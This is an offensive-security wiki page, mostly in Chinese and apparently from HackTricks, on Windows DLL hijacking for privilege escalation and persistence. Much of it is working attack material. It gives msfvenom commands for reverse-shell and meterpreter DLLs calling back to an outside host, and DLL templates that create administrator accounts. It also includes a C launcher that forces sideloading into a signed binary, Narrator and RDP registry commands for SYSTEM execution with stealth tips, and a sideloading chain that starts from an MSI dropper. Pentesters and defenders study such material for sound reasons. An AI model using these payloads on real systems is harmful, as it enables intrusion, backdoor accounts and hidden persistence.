# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本信息

DLL Hijacking 涉及操纵受信任的应用程序加载恶意 DLL。这个术语涵盖了若干策略，比如 **DLL Spoofing, Injection, and Side-Loading**。它主要用于代码执行、实现持久性，较少用于权限提升。尽管此处侧重于提升权限，劫持方法在不同目标之间基本一致。

### 常见技术

几种方法可用于 DLL hijacking，其有效性取决于应用程序的 DLL 加载策略：

1. **DLL Replacement**: 用恶意 DLL 替换真实 DLL，可选择使用 DLL Proxying 保留原始 DLL 的功能。
2. **DLL Search Order Hijacking**: 将恶意 DLL 放置在合法 DLL 之前的搜索路径中，利用应用的搜索模式。
3. **Phantom DLL Hijacking**: 为应用创建恶意 DLL，使其加载，认为这是一个不存在但必需的 DLL。
4. **DLL Redirection**: 修改搜索参数，如 %PATH% 或 `.exe.manifest` / `.exe.local` 文件，以将应用指向恶意 DLL。
5. **WinSxS DLL Replacement**: 在 WinSxS 目录中用恶意 DLL 替换合法 DLL，这种方法通常与 DLL side-loading 相关联。
6. **Relative Path DLL Hijacking**: 将恶意 DLL 放在与拷贝的应用同处的用户可控目录中，类似于 Binary Proxy Execution 技术。

> [!TIP]
> 要查看一个将 HTML staging、AES-CTR 配置和 .NET implants 分层于 DLL sideloading 之上的逐步链，请查看下面的工作流程。

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## 查找缺失的 Dlls

在系统内查找缺失 Dlls 最常见的方法是运行 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)（来自 sysinternals），并设置以下 2 个过滤器：

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

并仅显示 **File System Activity**：

![](<../../../images/image (153).png>)

如果你在一般情况下查找**缺失的 Dlls**，就让它运行几秒钟。\
如果你要查找特定可执行文件内的缺失 dll，应设置另一个过滤器，例如 "Process Name" "contains" `<exec name>`，运行它，然后停止捕获事件。

## 利用缺失的 Dlls

为了提升权限，我们最有机会的是能够在某个特权进程会尝试加载 dll 的搜索位置之一写入一个 dll。因此，我们可以在一个文件夹写入 dll，该文件夹在搜索顺序中位于存放原始 dll 的文件夹之前（奇怪的情况），或者我们可以写入到某个被搜索的文件夹中，而原始 dll 在任何文件夹中都不存在。

### Dll 搜索顺序

在 [Microsoft documentation](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) 中可以找到 Dlls 的具体加载方式。

Windows applications 按照一组预定义的搜索路径并遵循特定顺序来查找 DLL。当恶意 DLL 被策略性地放置在这些目录之一并在真实 DLL 之前被加载时，就会发生 DLL hijacking。防止此类问题的一种解决方案是确保应用在引用所需 DLL 时使用绝对路径。

你可以在下面看到 32 位系统上的 DLL 搜索顺序：

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

这是在启用 SafeDllSearchMode 时的默认搜索顺序。禁用时，当前目录会升至第二位。要禁用此功能，请创建注册表值 HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode 并将其设置为 0（默认是启用的）。

如果调用 [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 函数并使用 **LOAD_WITH_ALTERED_SEARCH_PATH**，则搜索将从 LoadLibraryEx 正在加载的可执行模块的目录开始。

最后，注意 dll 也可以通过指定绝对路径而不是仅名称来加载。在这种情况下，该 dll 只会在该路径中被搜索（如果该 dll 有任何依赖，它们将按仅通过名称加载时的方式被搜索）。

还有其他修改搜索顺序的方法，但此处不再详细说明。

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

通过在使用 ntdll 的原生 API 创建进程时设置 RTL_USER_PROCESS_PARAMETERS 中的 DllPath 字段，可以以确定性方式影响新建进程的 DLL 搜索路径。通过在此处提供攻击者可控的目录，如果目标进程通过名称解析导入 DLL（没有绝对路径且未使用安全加载标志），则可以强制其从该目录加载恶意 DLL。

Key idea
- 使用 RtlCreateProcessParametersEx 构建进程参数并提供指向你可控文件夹（例如 dropper/unpacker 所在目录）的自定义 DllPath。
- 使用 RtlCreateUserProcess 创建进程。当目标二进制按名称解析 DLL 时，加载器将在解析期间查阅所提供的 DllPath，从而即使恶意 DLL 未与目标 EXE 共置，也能实现可靠的 sideloading。

Notes/limitations
- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence。

最小 C 示例（ntdll，宽字符串，简化错误处理）：

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Windows 文档中关于 dll 搜索顺序的例外

Windows 文档中指出了对标准 DLL 搜索顺序的若干例外情况：

- 当遇到一个与内存中已加载的 DLL 同名的 DLL 时，系统会绕过通常的搜索。相反，它会先检查重定向和清单，然后在默认情况下使用内存中已存在的 DLL。**在这种情况下，系统不会对该 DLL 进行搜索**。
- 如果某个 DLL 被识别为当前 Windows 版本的 **known DLL**，系统将使用其版本的 known DLL 及其任何依赖的 DLL，**而不进行搜索过程**。注册表键 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** 保存了这些 known DLL 的列表。
- 如果某个 **DLL 有依赖项**，对这些依赖 DLL 的搜索将按照它们仅以 **module names** 指示的方式进行，无论最初的 DLL 是否通过完整路径被识别。

### 提权

**Requirements**：

- 找到一个以 **不同权限** 运行或将要以不同权限运行的进程（用于横向或侧向移动），且该进程**缺少某个 DLL**。
- 确保对任何将要**被搜索以查找该 DLL**的**目录**具有**写入权限**。该位置可能是可执行文件的目录或系统路径内的某个目录。

是的，满足这些前置条件通常比较困难，**默认情况下很难找到一个缺少 DLL 的特权可执行文件**，并且在系统路径文件夹上**拥有写权限更是不常见**（默认情况下你无法）。但在配置错误的环境中这是可能的。\
如果你很幸运地满足了这些条件，可以查看 [UACME](https://github.com/hfiref0x/UACME) 项目。即便该项目的**主要目标是绕过 UAC**，你也可能在那里找到针对你所用 Windows 版本的 DLL hijacking 的 **PoC**（可能只需更改到你有写权限的文件夹路径即可）。

注意，你可以通过以下方式**检查你在某个文件夹的权限**：
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
并 **检查 PATH 中所有文件夹的权限**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
你也可以检查可执行文件的 imports 和 dll 的 exports：
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
如需完整指南，了解如何 **滥用 Dll Hijacking 提升权限** 在 有权限写入 **系统 PATH 文件夹** 的情况下，请查看：


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
其他用于发现此漏洞的有趣自动化工具包括 **PowerSploit functions**：_Find-ProcessDLLHijack_、_Find-PathDLLHijack_ 和 _Write-HijackDll_。

### Example

如果你发现可利用的场景，成功利用它的关键之一是 **创建一个 DLL，至少导出可执行文件将从中导入的所有函数**。不过请注意，Dll Hijacking 在 [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) 或从[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)** 时非常有用。** 你可以在这篇针对执行的 dll hijacking 研究中找到一个 **如何创建有效 dll** 的示例： [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**\
此外，在 **next sectio**n 你可以找到一些 **基本的 dll 代码**，它们可作为 **模板** 或用于创建 **导出非必需函数的 dll**。

## **Creating and compiling Dlls**

### **Dll Proxifying**

基本上，**Dll proxy** 是一个能够 **在加载时执行你的恶意代码**，但也能 **暴露** 并 **按预期工作** 的 Dll，方法是 **通过将所有调用转发到真实库**。

使用工具 [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 或 [**Spartacus**](https://github.com/Accenture/Spartacus)，你实际上可以 **指定可执行文件并选择要 proxify 的库** 并 **生成一个 proxified dll**，或者 **指定该 Dll** 并 **生成一个 proxified dll**。

### **Meterpreter**

**获取 rev shell (x64)：**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**获取 meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**创建一个用户（x86，我没看到 x64 版本）：**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 你自己的

请注意，在很多情况下，你编译的 Dll 必须 **export several functions**，这些函数将被 victim process 加载；如果这些函数不存在，**binary won't be able to load** 它们，**exploit will fail**。

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL 示例：创建用户</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>带线程入口的替代 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## 案例研究： Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe 在启动时仍会探测一个可预测的、针对特定语言的 localization DLL，该 DLL 可被 hijacked 以实现 arbitrary code execution 和 persistence。

Key facts
- 探测路径（当前版本）：`%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- 旧路径（较旧的版本）：`%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- 如果在 OneCore 路径存在可写的、攻击者控制的 DLL，则该 DLL 会被加载，`DllMain(DLL_PROCESS_ATTACH)` 会执行。无需导出（exports）。

Discovery with Procmon
- 过滤器：`Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- 启动 Narrator 并观察对上述路径的加载尝试。

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- 简单的 hijack 会触发语音/高亮 UI。为保持安静，attach 时枚举 Narrator 的线程，打开主线程 (`OpenThread(THREAD_SUSPEND_RESUME)`) 并对其调用 `SuspendThread`；然后在你自己的线程中继续。完整代码见 PoC。

Trigger and persistence via Accessibility configuration
- 用户上下文 (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 有了上述设置，启动 Narrator 会加载已植入的 DLL。在安全桌面（登录屏幕）上，按 CTRL+WIN+ENTER 启动 Narrator。

RDP-triggered SYSTEM execution (lateral movement)
- 允许经典 RDP 安全层: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- 使用 RDP 连接到主机，在登录屏幕按 CTRL+WIN+ENTER 启动 Narrator；你的 DLL 会在安全桌面以 SYSTEM 身份执行。
- 当 RDP 会话关闭时执行会停止——请及时注入/迁移。

Bring Your Own Accessibility (BYOA)
- 你可以克隆一个内置的 Accessibility Tool (AT) 注册表项（例如 CursorIndicator），编辑它以指向任意二进制/DLL，导入后将 `configuration` 设置为该 AT 名称。这样可以在 Accessibility 框架下代理任意执行。

Notes
- 在 `%windir%\System32` 下写入以及更改 HKLM 值需要管理员权限。
- 所有 payload 逻辑都可以放在 `DLL_PROCESS_ATTACH` 中；不需要导出函数。

## 案例研究：CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

此案例演示了 Lenovo 的 TrackPoint Quick Menu (`TPQMAssistant.exe`) 中的 **Phantom DLL Hijacking**，编号为 **CVE-2025-1729**。

### 漏洞详情

- **组件**: `TPQMAssistant.exe` 位于 `C:\ProgramData\Lenovo\TPQM\Assistant\`。
- **计划任务**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` 每天 9:30 AM 在已登录用户的上下文中运行。
- **目录权限**: 对 `CREATOR OWNER` 可写，允许本地用户放置任意文件。
- **DLL 搜索行为**: 会先尝试从其工作目录加载 `hostfxr.dll`，如果缺失会记录 "NAME NOT FOUND"，表明本地目录优先搜索。

### 利用实现

攻击者可以在相同目录放置一个恶意的 `hostfxr.dll` 存根，利用缺失的 DLL 来在用户上下文下实现代码执行：
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 攻击流程

1. 以标准用户身份，将 `hostfxr.dll` 放入 `C:\ProgramData\Lenovo\TPQM\Assistant\`。
2. 等待计划任务在当前用户上下文中于上午 9:30 运行。
3. 如果在任务执行时管理员已登录，恶意 DLL 将以中等完整性在管理员会话中运行。
4. 链式使用常见 UAC bypass 技术，将权限从中等完整性提升到 SYSTEM 权限。

## 案例研究：MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

威胁行为者常常将基于 MSI 的 dropper 与 DLL side-loading 结合，以在受信任的已签名进程下执行 payload。

Chain overview
- 用户下载 MSI。GUI 安装期间会静默运行一个 CustomAction（例如 LaunchApplication 或 VBScript action），从嵌入的资源重构下一阶段。
- dropper 将合法的已签名 EXE 和恶意 DLL 写入相同目录（例如：Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll）。
- 当已签名的 EXE 被启动时，Windows 的 DLL 搜索顺序会优先从工作目录加载 wsc.dll，从而在已签名父进程下执行攻击者代码（ATT&CK T1574.001）。

MSI analysis (what to look for)
- CustomAction 表：
- 查找运行可执行文件或 VBScript 的条目。可疑示例模式：LaunchApplication 在后台执行嵌入文件。
- 在 Orca (Microsoft Orca.exe) 中，检查 CustomAction、InstallExecuteSequence 和 Binary 表。
- MSI CAB 中的嵌入/拆分 payload：
- 管理提取：msiexec /a package.msi /qb TARGETDIR=C:\out
- 或使用 lessmsi：lessmsi x package.msi C:\out
- 查找多个小片段，这些片段由 VBScript CustomAction 拼接并解密。常见流程：
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
使用 wsc_proxy.exe 的实战 sideloading
- Drop these two files in the same folder:
- wsc_proxy.exe: legitimate signed host (Avast). The process attempts to load wsc.dll by name from its directory.
- wsc.dll: attacker DLL. If no specific exports are required, DllMain can suffice; otherwise, build a proxy DLL and forward required exports to the genuine library while running payload in DllMain.
- Build a minimal DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- 对于导出需求，使用 proxying framework（例如 DLLirant/Spartacus）来生成一个 forwarding DLL，且同时执行你的 payload。

- 此技术依赖宿主二进制对 DLL 名称的解析。如果宿主使用绝对路径或安全加载标志（例如 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories），hijack 可能会失败。
- KnownDLLs、SxS 和 forwarded exports 会影响优先级，选择宿主二进制和导出集合时必须加以考虑。

## 参考

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
